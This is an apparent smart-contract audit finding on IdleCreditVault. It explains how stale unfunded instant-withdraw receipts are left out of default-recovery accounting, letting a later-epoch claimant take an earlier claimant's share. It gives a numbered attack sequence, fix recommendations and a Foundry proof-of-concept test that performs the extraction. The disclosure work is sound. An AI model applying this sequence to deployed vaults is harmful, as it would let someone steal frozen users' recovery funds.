### Title
Stale instant-withdraw receipts escape default accounting and lose recovery to later-epoch claimants - ([File: `contracts/strategies/idle/IdleCreditVault.sol`](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault` tracks unfunded instant withdrawals globally through `pendingInstantWithdraws`, but default recovery only adds requests recorded under the current `epochNumber`. An unfunded instant receipt from an earlier epoch is therefore excluded from `defaultPendingClaimBasis()` while still contributing to the aggregate pending bucket. A later-epoch claimant can receive an inflated recovery payout, while the older receipt is permanently unable to claim the reserve.

### Finding Description
The vulnerability is an epoch-identity confusion analogous to CVE-2015-5252’s ambiguous namespace/share boundary.

`requestInstantWithdraw()` stores each receipt under the current epoch and increments the global unfunded bucket:

```solidity
instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
pendingInstantWithdraws += _amount;
```

At default finalization, however, `defaultPendingClaimBasis()` includes the current epoch’s instant claims only when the global pending bucket is nonzero:

```solidity
basis = pendingWithdraws;
if (pendingInstantWithdraws != 0) {
  basis += instantWithdrawClaimsByEpoch[epochNumber];
}
```

If an old instant receipt remains unfunded and a new instant receipt is created in a later epoch, the old receipt is present in `pendingInstantWithdraws` but absent from `instantWithdrawClaimsByEpoch[epochNumber]`. Its basis is omitted from the recovery denominator.

After finalization, `claimInstantWithdrawRequest()` only clears a receipt under `defaultRecoveryEpoch`. The old receipt then falls through to `_transferFundedClaim()`, which refuses to spend `defaultRecoveryReserve`. The old claim is neither haircut through the recovery path nor payable as funded.

### Impact Explanation
A later-epoch attacker can capture the old claimant’s recovery allocation.

For example:

1. Victim has an unfunded `100` instant receipt from epoch `N`.
2. Attacker creates an unfunded `100` instant receipt in epoch `N + 1`.
3. The pool defaults in epoch `N + 1`.
4. Recovery finalization is supplied `200`, matching both receipts.
5. `totalBasis` counts only the attacker’s `100`, so `defaultRecoveryPrice` becomes `2e18`.
6. Attacker claims `200`.
7. Victim’s receipt remains recorded under epoch `N`, cannot be paid from the isolated recovery reserve, and is permanently frozen.

The direct loss is the full omitted receipt amount; in the minimal case, the attacker extracts a 100% recovery payout in excess of their receipt.

### Likelihood Explanation
The sequence does not require malicious privileged behavior:

- Instant withdrawals can remain pending when the manager does not call `getInstantWithdrawFunds()` before the next epoch stop.
- A successful epoch stop does not require instant withdrawals to be funded because the borrower pull covers interest and normal pending withdrawals, not `pendingInstantWithdraws`.
- A later borrower default and normal `finalizeDefaultRecovery()` call then crystallize the omitted old receipt.
- Any unprivileged KYC-approved tranche holder able to create a current-epoch instant request can receive the inflated recovery share.

Existing guards do not prevent this: `_claimDefaultedInstantWithdrawRequest()` checks only `defaultRecoveryEpoch`, while `_transferFundedClaim()` actively prevents the stale receipt from consuming the recovery reserve.

### Recommendation
Account for every unfunded instant receipt during default finalization, not only receipts recorded under `epochNumber`.

Possible approaches:

- Track the aggregate unfunded instant-claim basis by request epoch and iterate or maintain a separate `unfundedInstantClaimBasis`.
- Prevent a new epoch from starting while `pendingInstantWithdraws != 0`.
- Maintain separate funded and unfunded instant buckets instead of deriving current unfunded claims from the global aggregate.
- During claims, search all nonzero request epochs rather than only `defaultRecoveryEpoch`.

A regression test should cover an unfunded instant receipt surviving one successful epoch boundary, followed by a second-epoch instant request, default, recovery finalization, and claims by both users.

### Proof of Concept
The following test is intended to be added inside `test/foundry/IdleCreditVault.t.sol`, where `cdoEpoch`, `strategy`, `underlying`, `manager`, `borrower`, `defaultUnderlying`, `ONE_SCALE`, and the existing epoch helpers are available.

```solidity
function testStaleInstantReceiptEscapesDefaultRecovery() external {
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    uint256 amount = 100 * ONE_SCALE;

    address victim = makeAddr("stale-instant-victim");
    address attacker = makeAddr("current-instant-attacker");

    uint256 instantDelay = cdoEpoch.instantWithdrawDelay();
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(instantDelay, 0, true);

    // Epoch N: victim creates an unfunded instant receipt.
    _depositWithUser(victim, amount, true);
    _startEpochAndCheckPrices(0);

    vm.prank(manager);
    creditVault.setAprs(0, 0);

    uint256 victimRequestEpoch = creditVault.epochNumber();
    vm.prank(victim);
    uint256 victimReceipt = cdoEpoch.requestWithdraw(0, address(AAtranche));

    assertEq(
        creditVault.instantWithdrawsRequestsByEpoch(victim, victimRequestEpoch),
        victimReceipt
    );
    assertEq(creditVault.pendingInstantWithdraws(), victimReceipt);

    // The epoch ends normally without funding the instant request.
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

    // Epoch N + 1: attacker creates another unfunded instant receipt.
    _depositWithUser(attacker, amount, true);
    _startEpochAndCheckPrices(1);

    vm.prank(manager);
    creditVault.setAprs(0, 0);

    uint256 attackerRequestEpoch = creditVault.epochNumber();
    assertGt(attackerRequestEpoch, victimRequestEpoch);

    vm.prank(attacker);
    uint256 attackerReceipt = cdoEpoch.requestWithdraw(0, address(AAtranche));

    assertEq(
        creditVault.instantWithdrawsRequestsByEpoch(attacker, attackerRequestEpoch),
        attackerReceipt
    );
    assertEq(
        creditVault.pendingInstantWithdraws(),
        victimReceipt + attackerReceipt
    );

    // Borrower defaults during epoch N + 1.
    deal(defaultUnderlying, borrower, 0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    _checkDefault();

    // Recovery covers both receipts, but only the current-epoch receipt is in the denominator.
    uint256 recovered = victimReceipt + attackerReceipt;
    deal(defaultUnderlying, manager, recovered);

    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(creditVault), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    assertEq(creditVault.defaultRecoveryEpoch(), attackerRequestEpoch);
    assertEq(
        creditVault.defaultRecoveryPrice(),
        recovered * 1e18 / attackerReceipt
    );

    // Attacker receives both their own recovery and the victim's omitted share.
    uint256 attackerBalanceBefore =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker);

    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();

    assertEq(
        IERC20Detailed(defaultUnderlying).balanceOf(attacker) -
            attackerBalanceBefore,
        recovered
    );

    // The stale epoch-N receipt cannot enter the default-recovery path and cannot
    // spend the isolated reserve through the funded-claim path.
    vm.prank(victim);
    vm.expectRevert(NotAllowed.selector);
    cdoEpoch.claimInstantWithdrawRequest();

    assertEq(
        creditVault.instantWithdrawsRequests(victim),
        victimReceipt
    );
    assertEq(
        creditVault.instantWithdrawsRequestsByEpoch(victim, victimRequestEpoch),
        victimReceipt
    );
}
```
